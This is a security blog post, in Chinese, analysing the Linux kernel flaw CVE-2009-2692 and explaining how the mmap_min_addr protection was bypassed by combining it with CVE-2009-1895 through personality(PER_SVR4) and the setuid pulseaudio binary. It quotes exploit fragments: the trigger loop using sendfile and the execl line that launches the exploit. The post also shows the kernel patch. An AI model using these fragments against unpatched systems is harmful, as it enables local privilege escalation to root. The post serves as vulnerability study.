<!DOCTYPE html>
<html>
    
    
        <body class="post-body">
    
    
<header class="header">

    <div class="header-sidebar-menu">&#xe775;</div>
    <!-- post页的toggle banner  -->
    
    <div class="banner">
            <div class="blog-title">
                <a href="/" >fi3ework&#39;s Studio.</a>
            </div>
            <div class="post-title">
                <a href="#" class="post-name">CVE-2009-2692: How to Bypass mmap_min_addr</a>
            </div>
    </div>
    
    <a class="home-link" href=/>fi3ework's Studio.</a>
</header>
    <div class="wrapper">
        <div class="site-intro">
    
    <!-- 主页  -->
    
    
    <!-- 404页  -->
            
    <div class="site-intro-img" style="background-image: url(http://oumn0o088.bkt.clouddn.com/post-bg.jpg)"></div>
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
            CVE-2009-2692: How to Bypass mmap_min_addr
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
            
            <!-- 404 -->
            
        </p>
        <!-- 文章页meta -->
        
            <!-- 文章页标签  -->
            
                <div class= post-intro-tags >
    
        <a class="post-tag" href="javascript:void(0);" data-href = bypass mmap_min_addr>bypass mmap_min_addr</a>
    
        <a class="post-tag" href="javascript:void(0);" data-href = privilege escalation>privilege escalation</a>
    
</div>
            
            <div class="post-intro-meta">
                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
                <span class="post-intro-time">2017/09/26</span>
            </div>
        
    </div>
</div>
        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
        <script>
            var browser = {
                    versions: function () {
                        var u = window.navigator.userAgent;
                        return {
                            userAgent: u,
                            trident: u.indexOf('Trident') > -1, //IE内核
                            presto: u.indexOf('Presto') > -1, //opera内核
                            webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
                            gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
                            mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
                            ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
                            android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
                            iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
                            iPad: u.indexOf('iPad') > -1, //是否为iPad
                            webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
                            weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
                            uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
                        };
                    }()
                }

            function fontLoaded(){
                console.log('font loaded');
                if (document.getElementsByClassName('site-intro-meta')) {
                    document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
                    document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
                    var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
                        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
                        if (postIntroTags) {
                            postIntroTags.classList.add('post-fade-in');
                        }
                        if (postIntroMeat) {
                            postIntroMeat.classList.add('post-fade-in');
                        }
                    }
                }
                
            console.log("userAgent:" + browser.versions.userAgent);
            // UC不支持跨域，所以直接显示
            if (browser.versions.uc) {
                console.log("UCBrowser");
                fontLoaded();
            } else {
                WebFont.load({
                    custom: {
                        families: ['Oswald-Regular']
                    },
                    loading: function () {  //所有字体开始加载
                        // console.log('loading');
                    },
                    active: function () {  //所有字体已渲染
                        fontLoaded();
                    },
                    inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
                        console.log('inactive: timeout');
                        fontLoaded();
                    },
                    timeout: 7000 // Set the timeout to two seconds
                });
            }
        </script>
        <div class="container container-unloaded">
            <main class="main post-page">
    <article class="article-entry">
        <p>首先看一下这个漏洞的简要描述：<br>The Linux kernel 2.6.0 through 2.6.30.4, and 2.4.4 through 2.4.37.4, does not initialize all function pointers for socket operations in proto_ops structures, which allows local users to trigger a NULL pointer dereference and gain privileges by using mmap to map page zero, placing arbitrary code on this page, and then invoking an unavailable operation, as demonstrated by the sendpage operation (sock_sendpage function) on a PF_PPPOX socket.<br><a id="more"></a><br>说来也很简单，就是由于socket结构体的proto_ops字段里的有些函数指针没有初始化可以导致NULL pointer dereference。虽然这种漏洞提权很简单，但是前提是可以mmap page zero！但是linux大部分情况下是设置mmap_min_addr大于等于65536的，所以在实际漏洞利用中我们一般是无法mmap page zero的，除非绕过这个限制！这就是我为什么要花点时间研究一下这个漏洞的原因——因为exp中介绍了一种可以bypass NULL pointer dereference防御的方法！</p>
<h2 id="cve-2009-2692-analysis"><a href="#cve-2009-2692-analysis" class="headerlink" title="cve-2009-2692 analysis"></a>cve-2009-2692 analysis</h2><p>首先还是简单分析一下这个漏洞的成因。前面的描述居然不说漏洞在哪个函数~害得我找了老半天没找着，最后还是在另外一个地方找到了稍微详细点的描述：<br>Description of problem:<br>Reported by Tavis Ormandy and Julien Tinnes. The SOCKOPS_WRAP macro from include/linux/net.h doesn’t initialise the sendpage operation in the proto_ops structure correctly. Leading to a kernel NULL pointer dereference, and thus a local privilege escalation.<br>看下SOCKOPS_WRAP到底是怎么初始化proto_ops的：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKOPS_WRAP(name, fam)					\</span></div><div class="line">SOCKCALL_WRAP(name, release, (struct socket *sock), (sock))	\</div><div class="line">SOCKCALL_WRAP(name, bind, (struct socket *sock, struct sockaddr *uaddr, int addr_len), \</div><div class="line">	      (sock, uaddr, addr_len))				\</div><div class="line">SOCKCALL_WRAP(name, connect, (struct socket *sock, struct sockaddr * uaddr, \</div><div class="line">			      int addr_len, int flags), 	\</div><div class="line">	      (sock, uaddr, addr_len, flags))			\</div><div class="line">SOCKCALL_WRAP(name, socketpair, (struct socket *sock1, struct socket *sock2), \</div><div class="line">	      (sock1, sock2))					\</div><div class="line">SOCKCALL_WRAP(name, accept, (struct socket *sock, struct socket *newsock, \</div><div class="line">			 int flags), (sock, newsock, flags)) \</div><div class="line">SOCKCALL_WRAP(name, getname, (struct socket *sock, struct sockaddr *uaddr, \</div><div class="line">			 int *addr_len, int peer), (sock, uaddr, addr_len, peer)) \</div><div class="line">SOCKCALL_UWRAP(name, poll, (struct file *file, struct socket *sock, struct poll_table_struct *wait), \</div><div class="line">	      (file, sock, wait)) \</div><div class="line">SOCKCALL_WRAP(name, ioctl, (struct socket *sock, unsigned int cmd, \</div><div class="line">			 unsigned long arg), (sock, cmd, arg)) \</div><div class="line">SOCKCALL_WRAP(name, compat_ioctl, (struct socket *sock, unsigned int cmd, \</div><div class="line">			 unsigned long arg), (sock, cmd, arg)) \</div><div class="line">SOCKCALL_WRAP(name, listen, (struct socket *sock, int len), (sock, len)) \</div><div class="line">SOCKCALL_WRAP(name, shutdown, (struct socket *sock, int flags), (sock, flags)) \</div><div class="line">SOCKCALL_WRAP(name, setsockopt, (struct socket *sock, int level, int optname, \</div><div class="line">			 char __user *optval, int optlen), (sock, level, optname, optval, optlen)) \</div><div class="line">SOCKCALL_WRAP(name, getsockopt, (struct socket *sock, int level, int optname, \</div><div class="line">			 char __user *optval, int __user *optlen), (sock, level, optname, optval, optlen)) \</div><div class="line">SOCKCALL_WRAP(name, sendmsg, (struct kiocb *iocb, struct socket *sock, struct msghdr *m, size_t len), \</div><div class="line">	      (iocb, sock, m, len)) \</div><div class="line">SOCKCALL_WRAP(name, recvmsg, (struct kiocb *iocb, struct socket *sock, struct msghdr *m, size_t len, int flags), \</div><div class="line">	      (iocb, sock, m, len, flags)) \</div><div class="line">SOCKCALL_WRAP(name, mmap, (struct file *file, struct socket *sock, struct vm_area_struct *vma), \</div><div class="line">	      (file, sock, vma)) \</div><div class="line">	      \</div><div class="line">static const struct proto_ops name##_ops = &#123;			\</div><div class="line">	.family		= fam,				\</div><div class="line">	.owner		= THIS_MODULE,			\</div><div class="line">	.release	= __lock_##name##_release,	\</div><div class="line">	.bind		= __lock_##name##_bind,		\</div><div class="line">	.connect	= __lock_##name##_connect,	\</div><div class="line">	.socketpair	= __lock_##name##_socketpair,	\</div><div class="line">	.accept		= __lock_##name##_accept,	\</div><div class="line">	.getname	= __lock_##name##_getname,	\</div><div class="line">	.poll		= __lock_##name##_poll,		\</div><div class="line">	.ioctl		= __lock_##name##_ioctl,	\</div><div class="line">	.compat_ioctl	= __lock_##name##_compat_ioctl,	\</div><div class="line">	.listen		= __lock_##name##_listen,	\</div><div class="line">	.shutdown	= __lock_##name##_shutdown,	\</div><div class="line">	.setsockopt	= __lock_##name##_setsockopt,	\</div><div class="line">	.getsockopt	= __lock_##name##_getsockopt,	\</div><div class="line">	.sendmsg	= __lock_##name##_sendmsg,	\</div><div class="line">	.recvmsg	= __lock_##name##_recvmsg,	\</div><div class="line">	.mmap		= __lock_##name##_mmap,		\</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>proto_ops最后一个函数指针sendpage没有初始化，从而在调用sock_sendpage是会导致NULL pointer dereference。受影响的protocol有很多，不只是上面提到的PF_PPPOX。可以这样看哪些protocol受到了影响：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">repeat_it:</div><div class="line">		<span class="keyword">for</span> (; domains[d][<span class="number">0</span>] != DOMAINS_STOP; d++) &#123;</div><div class="line">			<span class="keyword">if</span> ((out = socket(domains[d][<span class="number">0</span>], domains[d][<span class="number">1</span>], domains[d][<span class="number">2</span>])) &gt;= <span class="number">0</span>)</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">		&#125;</div><div class="line">    </div><div class="line">		<span class="keyword">if</span> (out &lt; <span class="number">0</span>) &#123;</div><div class="line">			<span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">"unable to find a vulnerable domain, sorry\n"</span>);</div><div class="line">			<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">// Truncate input file to some large value</span></div><div class="line">		ftruncate(in, getpagesize());</div><div class="line"></div><div class="line">		<span class="comment">// sendfile() to trigger the bug.</span></div><div class="line">		sendfile(out, in, <span class="literal">NULL</span>, getpagesize());</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (got_ring0) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"target domain: %d\n"</span>, d);</div><div class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">" [+] got ring0!\n"</span>);</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		d++;</div><div class="line">		<span class="keyword">goto</span> repeat_it;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>具体exp请参考<a href="https://github.com/SecWiki/linux-kernel-exploits/tree/master/2009/CVE-2009-2692" target="_blank" rel="external">这里</a>。</p>
<h2 id="Bypass-mmap-min-addr-protection"><a href="#Bypass-mmap-min-addr-protection" class="headerlink" title="Bypass mmap_min_addr protection"></a>Bypass mmap_min_addr protection</h2><p>现在关键是怎么bypass mmap_min_addr protection。<br>这就需要利用到另外一个漏洞——CVE-2009-1895。看下这个漏洞的描述：<br>The personality subsystem in the Linux kernel before 2.6.31-rc3 has a PER_CLEAR_ON_SETID setting that does not clear the ADDR_COMPAT_LAYOUT and MMAP_PAGE_ZERO flags when executing a setuid or setgid program, which makes it easier for local users to leverage the details of memory usage to (1) conduct NULL pointer dereference attacks, (2) bypass the mmap_min_addr protection mechanism, or (3) defeat address space layout randomization (ASLR).<br>分析一下源码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"> * Flags for bug emulation.</div><div class="line"> *</div><div class="line"> * These occupy the top three bytes.</div><div class="line"> */</div><div class="line"><span class="keyword">enum</span> &#123;</div><div class="line">       ADDR_NO_RANDOMIZE =     <span class="number">0x0040000</span>,      <span class="comment">/* disable randomization of VA space */</span></div><div class="line">       FDPIC_FUNCPTRS =        <span class="number">0x0080000</span>,      <span class="comment">/* userspace function ptrs point to descriptors</span></div><div class="line">                                                * (signal handling)</div><div class="line">                                                */</div><div class="line">       MMAP_PAGE_ZERO =        <span class="number">0x0100000</span>,</div><div class="line">       ADDR_COMPAT_LAYOUT =    <span class="number">0x0200000</span>,</div><div class="line">       READ_IMPLIES_EXEC =     <span class="number">0x0400000</span>,</div><div class="line">       ADDR_LIMIT_32BIT =      <span class="number">0x0800000</span>,</div><div class="line">       SHORT_INODE =           <span class="number">0x1000000</span>,</div><div class="line">       WHOLE_SECONDS =         <span class="number">0x2000000</span>,</div><div class="line">       STICKY_TIMEOUTS =       <span class="number">0x4000000</span>,</div><div class="line">       ADDR_LIMIT_3GB =        <span class="number">0x8000000</span>,</div><div class="line">&#125;;</div><div class="line"> </div><div class="line"><span class="comment">/*</span></div><div class="line"> * Security-relevant compatibility flags that must be</div><div class="line"> * cleared upon setuid or setgid exec:</div><div class="line"> */</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PER_CLEAR_ON_SETID (READ_IMPLIES_EXEC|ADDR_NO_RANDOMIZE)</span></div></pre></td></tr></table></figure></p>
<p>所以我们只需要找到一个setuid的program可以执行我们的exp就能绕过mmap_min_addr protection。<br>首先用personality系统调用设置persona：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ret = personality(PER_SVR4);</div><div class="line"></div><div class="line"><span class="comment">//PER_SVR4 = 0x0001 | STICKY_TIMEOUTS | MMAP_PAGE_ZERO</span></div><div class="line"><span class="comment">//PER_SVR4 = 0x4100001</span></div></pre></td></tr></table></figure></p>
<p>然后suid program会clear PER_CLEAR_ON_SETID，但是MMAP_PAGE_ZERO并没有clear，所以程序此时可以mmap page zero。然后就是布置payload即可。<br>很辛运的是在大部分linux中都有这样一个setuid的program：pulseaudio，而且可以通过他的-L选项来执行我们的exp。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">execl(PULSEAUDIO_PATH, PULSEAUDIO_PATH, <span class="string">"--log-level=0"</span>, <span class="string">"-L"</span>, PATH_TO_EXPLOIT, <span class="literal">NULL</span>);</div></pre></td></tr></table></figure></p>
<p>现在的话这个漏洞基本已经被修复了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PER_CLEAR_ON_SETID (READ_IMPLIES_EXEC|ADDR_NO_RANDOMIZE|ADDR_COMPAT_LAYOUT|MMAP_PAGE_ZERO)</span></div></pre></td></tr></table></figure></p>
<p>所以现在还有什么措施能绕过NULL pointer dereference protection？</p>
<h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">diff --git a/net/socket.c b/net/socket.c</div><div class="line">index 791d71a..6d47165 100644</div><div class="line">--- a/net/socket.c</div><div class="line">+++ b/net/socket.c</div><div class="line">@@ -736,7 +736,7 @@ static ssize_t sock_sendpage(struct file *file, struct page *page,</div><div class="line"> 	if (more)</div><div class="line"> 		flags |= MSG_MORE;</div><div class="line"> </div><div class="line">-	return sock-&gt;ops-&gt;sendpage(sock, page, offset, size, flags);</div><div class="line">+	return kernel_sendpage(sock, page, offset, size, flags);</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
<h2 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h2><p><a href="https://bugzilla.redhat.com/show_bug.cgi?id=516949" target="_blank" rel="external">Bug 516949 - (CVE-2009-2692) CVE-2009-2692 kernel: uninit op in SOCKOPS_WRAP() leads to privesc</a><br><a href="http://webcache.googleusercontent.com/search?q=cache:http://blog.cr0.org/2009/06/bypassing-linux-null-pointer.html" target="_blank" rel="external">Bypassing Linux’ NULL pointer dereference exploit prevention (mmap_min_addr)</a><br><a href="https://xorl.wordpress.com/2009/07/16/cve-2009-1895-linux-kernel-per_clear_on_setid-personality-bypass/" target="_blank" rel="external">CVE-2009-1895: Linux kernel PER_CLEAR_ON_SETID Personality Bypass</a><br><a href="https://access.redhat.com/security/cve/cve-2009-1895" target="_blank" rel="external">CVE-2009-1895</a><br><a href="http://man7.org/linux/man-pages/man2/personality.2.html" target="_blank" rel="external">PERSONALITY(2) </a></p>

    </article>
    <!-- 前后页  -->
    <ul class="post-pager">
        
            <li class="next">
                <a href= "/2017/09/28/CVE-2010-3301-ia32syscall-Emulation-Privilege-Escalation/" title= CVE-2010-3301: ia32syscall Emulation Privilege Escalation >
                    <span>Next Post</span>
                    <span>CVE-2010-3301: ia32syscall Emulation Privilege Escalation</span>
                </a>
            </li>
        
        
            <li class="previous">
                <a href= "/2017/09/24/CVE-2008-0600-vmsplice-Privilege-Escalation/" title= CVE-2008-0600: vmsplice() Privilege Escalation >
                    <span>Previous Post</span>
                    <span>CVE-2008-0600: vmsplice() Privilege Escalation</span>
                </a>
            </li>
        
    </ul>
    <!-- 评论插件 -->
    <!-- 来必力City版安装代码 -->

<!-- City版安装代码已完成 -->
    
    
    <!--PC版-->

    <!--PC版-->


    
</main>
            <!-- profile -->
            
        </div>
        <footer class="footer footer-unloaded">
    <!-- social  -->
    
    <div class="social">
        
    
        
            
                <a href="mailto:12345@qq.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
            
                <a href="//github.com/fi3ework" class="iconfont-archer github" target="_blank" title="github"></a>
            
        
    
        
    
        
            
                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
            
        
    

    </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">Theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">archer</a></span>
    </div>
    <!-- 不蒜子  -->
    
</footer>
    </div>
    <!-- toc -->
    
    <div class="toc-wrapper">
        <div class="toc-catalog">
            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
        </div>
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2009-2692-analysis"><span class="toc-number">1.</span> <span class="toc-text">cve-2009-2692 analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-mmap-min-addr-protection"><span class="toc-number">2.</span> <span class="toc-text">Bypass mmap_min_addr protection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Patch"><span class="toc-number">3.</span> <span class="toc-text">Patch</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Links"><span class="toc-number">4.</span> <span class="toc-text">Links</span></a></li></ol>
    </div>
    
    <div class="back-top">&#xe639;</div>
    <div class="sidebar">
    <div class="sidebar-header sidebar-header-show-archive">
        <div class="sidebar-category">
            <span class="sidebar-archive-link"><span class="iconfont-archer">&#xe67d;</span>Archive</span>
            <span class="sidebar-tags-link"><span class="iconfont-archer">&#xe610;</span>Tag</span>
        </div>
    </div>
    <div class="sidebar-content sidebar-content-show-archive">
        
        <div class="sidebar-tags">
    <div class="sidebar-tags-name">
    
        <span class="sidebar-tag-name"><a href= "#">kernel exploit</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">ctf</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">kernel arbitrary write</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">kernel arbitrary read</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">off-by-one</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">ptmx</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">kernel UAF</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">rootkit</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">stack</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">canary</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">fortify</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">kernel arbitray write/read</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">overwrite cred</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">use-after-free</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">unsorted bin attack</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">fastbin unlink attack</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">PIE</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">RELRO</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">offset2libc</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">house-of-force</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">stackoverflow</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">IO redirect</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">dup & dup2</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">double free</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">unlink</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">malloc_consolidate</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">got_overwrite</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">format string vlun</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">fsb</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">DynELF</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">malloc_hook fastbins</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">fastbin attack</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">FILE stream pointer overflow</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">kernel build</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">stack pivot</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">ROP</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">stack overflow</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">syscall</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">libc-db</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">bypass mmap_min_addr</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">privilege escalation</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">ia32syscall</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">crypto</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">RSA</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">AES</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">windows</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">injection</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">kernel debug</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">LKM</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">null pointer</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">overflow</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">FSPO</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">_IO_list_all</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">hooing system</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">kernel rop</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">seccomp</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">slab</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">slub overflow</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">shmid_kernel</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">tty driver</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">tls_dtor_list</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">heap overflow</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">Linux Kernel</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">SROP</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">splice</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">socket & pipe</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">fuzzing</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">AFL</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">kernel basis</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">arm</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">assemble</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">heap</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">exploit</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">kernel memory leaking</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">stackjacking</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">Linux_Driver</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">ioctl</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">got overwrite</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">pwnable</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">stack_canary</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">c++</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">kernel_exploit</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">return to dl-resolve</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">inode</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">file_operations</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">compound pages</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">integer overflow</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">kernel write zero</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">clear_child_tid</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">set_fs && KERNEL_DS</a></span>
    
    </div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
    缺失模块。<br/>
    1、请确保node版本大于6.2<br/>
    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
    3、在根目录_config.yml里添加配置：
    <pre style="color: #888; font-size: 0.6rem;">
jsonContent:
  meta: false
  pages: false
  posts:
    title: true
    date: true
    path: true
    text: false
    raw: false
    content: false
    slug: false
    updated: false
    comments: false
    link: false
    permalink: false
    excerpt: false
    categories: false
    tags: true</pre>
    </div> 
    <div class="sidebar-tag-list"></div>
</div>
    </div>
</div> 
    <script>
    var jsInfo = {
        root: '/'
    }
</script>
    <!-- 不蒜子  -->
    
    <!-- CNZZ统计  -->
    
    </div>
    </body>
</html>


